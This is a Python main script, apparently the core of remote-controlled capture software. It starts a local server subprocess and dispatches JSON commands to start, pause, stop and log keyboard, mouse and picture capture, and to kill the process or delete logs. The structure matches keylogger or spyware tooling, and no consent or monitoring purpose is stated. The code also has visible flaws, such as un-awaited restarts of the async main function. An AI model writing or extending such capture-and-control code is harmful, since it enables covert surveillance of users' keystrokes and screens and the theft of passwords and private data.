from app._init_client import Env as env
from app._config import Config as client_config
from app._client import Client as client
from app._server import Server as server
from app.functions import send_api, redirect_output,check_env, load_env, check_log, run_server_sub
from app.tasks_functions import *
import asyncio, threading, multiprocessing, queue, subprocess
import queue
import sys #close terminal 
import json
threads_done = threading.Event()
URL = "http://localhost:8000/api/"

async def main():
    """main function"""

    # try:
    if threads_done.is_set(): return # If the thread is already running, do nothing
    elif not threads_done.is_set(): threads_done.set() # Set the thread as running
    
    #check if log file exist
    if not await check_log(): return await main() #if error, restart the main function
    
    #if .env file is not valid, we create it
    
    if not await check_env():
        # creating a suitable configuration
        generate_env = env()
        if not await generate_env.ainit(): raise Exception("Error while init .env file")
        
        #applying the configuration & save it on .env file
        generate_config = client_config()
        generated_config = await generate_config.ainit()
        if not generated_config: raise Exception("Error while init config")
    else: 
        generate_config = await load_env()
    
    # Queue for the server subprocess
    server_output_queue = queue.Queue()
    
    # Starting the server with the configuration
    start_server = server()
    if not await start_server.ainit(generate_config): return main() #if error, restart the main function
    
    # Run the server subprocess
    server_process = run_server_sub()
    
    # Create a thread to read output
    server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))

    ## /!\ Start subprocess server /!\ ###
    try:
        server_output_thread.start()
    except: return main() #if error, restart the main function
    ## /!\ Start subprocess server /!\ ###
    
    #when all is good, we can send data to api ---------------------------------DONT LOST THAT NAGIB :D -----------------------------
    # await send_api(URL, generated_config)
    
    #starting the client with the configuration
    generate_client = client()
    if not await generate_client.ainit(generate_config): return main() #if error, restart the main function
    
    
    while True:
        if subprocess.Popen.poll(server_process) != None:# Forced restart if the server is closed by ? entity
            server_process = PAUSE_SERVER(1,server_process)
            server_output_queue = queue.Queue()
            server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
            server_output_thread.start()
            
            
        elif subprocess.Popen.poll(server_process) == None:# If is enabled
            if not server_output_queue.empty(): # Check if the server has sent any output
                line = server_output_queue.get()
                if not line:# If the server has closed reset the queue and thread
                    server_output_queue = queue.Queue()
                    server_output_thread = threading.Thread(target=redirect_output, args=(server_process.stdout, server_output_queue))
                    server_output_thread.start()
                else:
                    
                    # Error gestion
                    if line != None:
                        data = str(line).replace("'", "\"")
                        data_json = json.loads(data)
                        if data_json['error'] == 404:line = None # If data is not recognized by the server, reset the queue and thread
                        else: 
                            commande = int(data_json["index_task"])
                            
                            if commande == 0: 
                                server_process = PAUSE_SERVER(data_json["x_break"],server_process)
                            if commande == 1:
                                PAUSE_CAPTURE_KEYBOARD()
                            if commande == 2:
                                PAUSE_CAPTURE_MOUSE()
                            if commande == 3:
                                PAUSE_CAPTURE_PICTURE()
                            if commande == 4:
                                STOP_SERVER()
                            if commande == 5:
                                STOP_CAPTURE_KEYBOARD()
                            if commande == 6:
                                STOP_CAPTURE_MOUSE()
                            if commande == 7:
                                STOP_CAPTURE_PICTURE()
                            if commande == 8:
                                RESTART_SERVER()
                            if commande == 9:
                                RESTART_CAPTURE_KEYBOARD()
                            if commande == 10:
                                RESTART_CAPTURE_MOUSE()
                            if commande == 11:
                                RESTART_CAPTURE_PICTURE()
                            if commande == 12:
                                STOP_LOG_KEYBOARD()
                            if commande == 13:
                                STOP_LOG_MOUSE()
                            if commande == 14:
                                STOP_LOG_PICTURE()
                            if commande == 15:
                                START_LOG_KEYBOARD()
                            if commande == 16:
                                START_LOG_MOUSE()
                            if commande == 17:
                                START_LOG_PICTURE()
                            if commande == 18:
                                STATUS_SERVER()
                            if commande == 19:
                                STATUS_LOG()
                            if commande == 20:
                                STATUS_CAPTURE()
                            if commande == 21:
                                RESET_CONFIG()
                            if commande == 22:
                                KILL()
                            if commande == 23:
                                LOG_TIMER()
                            if commande == 24:
                                DELETE_LOG()
                                    
                            
                            
        
    # except Exception as err: print(err)
    # finally: print("[x] - Server close") # Signal the end of the thread
        
if __name__ == "__main__":
    multiprocessing.set_start_method('spawn')
    asyncio.run(main())
    threads_done.clear()
    sys.exit() #close terminal if exist
    